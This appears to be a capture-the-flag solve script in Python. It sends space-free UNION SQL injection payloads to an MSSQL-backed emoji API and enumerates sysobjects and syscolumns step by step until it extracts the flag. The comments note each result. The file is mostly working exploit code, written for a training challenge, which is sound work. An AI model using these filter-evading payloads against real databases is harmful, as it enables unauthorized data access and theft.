import requests

# DBName: CatEmojiDB

# 1. List tables

payload = "(-1)union((select(1),(2),(3),(string_agg(name, ',')),(5)from[sysobjects]where(xtype='U')));"
x = requests.get(f'http://chals1.ais3.org:9487/api/emoji/{payload}')
print(x.content)
# Got Table name `s3cr3t_fl4g_in_th1s_t4bl3`

# 2. List table id;
payload = "(-1)union((select(1),(2),(3),(string_agg(id, ',')),(5)from[sysobjects]where((xtype='U')and(name='s3cr3t_fl4g_in_th1s_t4bl3'))));"
x = requests.get(f'http://chals1.ais3.org:9487/api/emoji/{payload}')
print(x.content)
# id: 901578250

# 3. List columns;
payload = "(-1)union((select(1),(2),(3),(string_agg(name, ',')),(3)from[syscolumns]where(id=901578250)));"
x = requests.get(f'http://chals1.ais3.org:9487/api/emoji/{payload}')
print(x.content)
# name: m1ght_be_th3_f14g

# 4. List values;
payload = "(-1)union((select(1),(2),(3),(string_agg(m1ght_be_th3_f14g, ',')),(3)from[s3cr3t_fl4g_in_th1s_t4bl3]));"
x = requests.get(f'http://chals1.ais3.org:9487/api/emoji/{payload}')
print(x.content)
# AIS3{Yep /r/BadUIBattles happened again}

## Reference
# https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
# https://websec.wordpress.com/2010/03/19/exploiting-hard-filtered-sql-injections/